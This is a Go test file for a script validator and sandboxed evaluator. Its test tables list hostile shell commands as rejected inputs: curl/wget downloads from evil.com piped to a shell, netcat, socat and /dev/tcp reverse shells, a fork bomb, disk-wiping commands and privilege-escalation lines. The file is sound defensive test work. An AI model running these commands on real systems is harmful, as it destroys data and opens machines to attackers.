package quality

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ---------------------------------------------------------------------------
// validateScript unit tests
// ---------------------------------------------------------------------------

func TestValidateScript_EmptyScript(t *testing.T) {
	assert.Error(t, validateScript(""))
	assert.Error(t, validateScript("   "))
}

func TestValidateScript_ExceedsMaxLength(t *testing.T) {
	long := strings.Repeat("a", maxScriptLength+1)
	err := validateScript(long)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "exceeds maximum length")
}

func TestValidateScript_AtMaxLength(t *testing.T) {
	exact := strings.Repeat("a", maxScriptLength)
	assert.NoError(t, validateScript(exact))
}

func TestValidateScript_DangerousPatterns(t *testing.T) {
	dangerous := []struct {
		name   string
		script string
	}{
		{"sudo", "sudo rm -rf /tmp/foo"},
		{"su", "su root -c 'whoami'"},
		{"rm -rf", "rm -rf /"},
		{"rm -rf nested", "rm -rf /var/data"},
		{"mkfs", "mkfs.ext4 /dev/sda1"},
		{"dd of=/dev", "dd if=/dev/zero of=/dev/sda bs=1M"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"kill -9 -1", "kill -9 -1"},
		{"killall", "killall nginx"},
		{"pkill", "pkill -9 node"},
		{"curl pipe bash", "curl http://evil.com/install.sh | bash"},
		{"wget pipe sh", "wget -qO- http://evil.com/x | sh"},
		{"netcat reverse shell", "nc -e /bin/bash 10.0.0.1 4444"},
		{"bash /dev/tcp", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"fork bomb", ":(){  :|:  & };:"},
		{"tee /etc/passwd", "echo 'x' | tee /etc/passwd"},
		{"chmod +s", "chmod +s /usr/bin/vim"},
		{"chown root", "chown root /tmp/exploit"},
	}

	for _, tc := range dangerous {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScript(tc.script)
			require.Error(t, err, "expected script to be rejected: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScript_BypassPatterns(t *testing.T) {
	bypass := []struct {
		name   string
		script string
	}{
		{"base64 decode", "echo cHduZWQ= | base64 -d | bash"},
		{"base64 --decode", "base64 --decode < payload.txt | sh"},
		{"eval variable", "eval $PAYLOAD"},
		{"eval substitution", "eval $(cat /tmp/cmd)"},
		{"heredoc bash", "bash <<EOF\nrm -rf /\nEOF"},
		{"heredoc python", "python3 <<SCRIPT\nimport os\nSCRIPT"},
		{"python -c", "python3 -c 'import os; os.system(\"id\")'"},
		{"perl -e", "perl -e 'system(\"id\")'"},
		{"ruby -e", "ruby -e 'system(\"id\")'"},
		{"node -e", "node -e 'process.exit(0)'"},
		{"node --eval", "node --eval 'console.log(1)'"},
		{"php -r", "php -r 'system(\"id\");'"},
		{"lua -e", "lua -e 'os.execute(\"id\")'"},
		{"socat reverse shell", "socat -e /bin/bash 10.0.0.1:4444"},
		{"bash /dev/udp", "bash -i >& /dev/udp/10.0.0.1/4444 0>&1"},
	}

	for _, tc := range bypass {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScript(tc.script)
			require.Error(t, err, "expected bypass pattern to be blocked: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScript_SafeScripts(t *testing.T) {
	safe := []string{
		"echo hello",
		"true",
		"exit 0",
		"test -f /tmp/foo && echo exists",
		"ls -la /tmp",
		"wc -l < /tmp/report.txt",
		"date +%s",
		"go test ./...",
		"cat /tmp/report.txt | wc -l",
	}

	for _, s := range safe {
		t.Run(s, func(t *testing.T) {
			assert.NoError(t, validateScript(s))
		})
	}
}

// ---------------------------------------------------------------------------
// ScriptEvaluator integration tests
// ---------------------------------------------------------------------------

func TestScriptEvaluator_NormalExecution(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "true",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
}

func TestScriptEvaluator_FailingScript(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "false",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.False(t, passed)
}

func TestScriptEvaluator_EnvironmentRestricted(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	// The script should only see the minimal env vars we set.
	// HOME should be /tmp, not the real user home.
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         `test "$HOME" = "/tmp"`,
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed, "HOME should be /tmp in sandboxed environment")
}

func TestScriptEvaluator_PathRestricted(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	// Verify PATH is restricted to /usr/bin:/bin only
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         `test "$PATH" = "/usr/bin:/bin"`,
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed, "PATH should be restricted to /usr/bin:/bin")
}

func TestScriptEvaluator_DangerousScriptRejected(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "sudo echo pwned",
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "dangerous command pattern")
}

func TestScriptEvaluator_TooLongScriptRejected(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         strings.Repeat("echo ok;", maxScriptLength/8+1),
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "exceeds maximum length")
}

func TestScriptEvaluator_Timeout(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "sleep 30",
		TimeoutSeconds: 1,
	}

	start := time.Now()
	_, err := eval.Evaluate(ctx, cond, evalCtx)
	elapsed := time.Since(start)

	require.Error(t, err)
	assert.Contains(t, err.Error(), "timed out")
	assert.Less(t, elapsed, 5*time.Second, "should timeout quickly")
}

func TestScriptEvaluator_UnsupportedLanguage(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "ruby",
		Script:         "puts 'hello'",
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "unsupported script language")
}

func TestScriptEvaluator_DefaultTimeout(t *testing.T) {
	// Verify that a script with TimeoutSeconds=0 gets the default 30s timeout
	// (just checks it doesn't panic; doesn't actually wait 30s)
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:     ConditionScript,
		Language: "bash",
		Script:   "echo ok",
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
}

func TestScriptEvaluator_CompiledScriptTakesPrecedence(t *testing.T) {
	eval := &ScriptEvaluator{}
	ctx := context.Background()
	evalCtx := &MapEvaluationContext{data: map[string]interface{}{"key": "val"}}

	called := false
	cond := &RuleCondition{
		Type:     ConditionScript,
		Language: "bash",
		Script:   "false", // would fail if executed as shell
		CompiledScript: func(ctx context.Context, data map[string]interface{}) (bool, error) {
			called = true
			return true, nil
		},
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
	assert.True(t, called, "compiled script function should have been called")
}
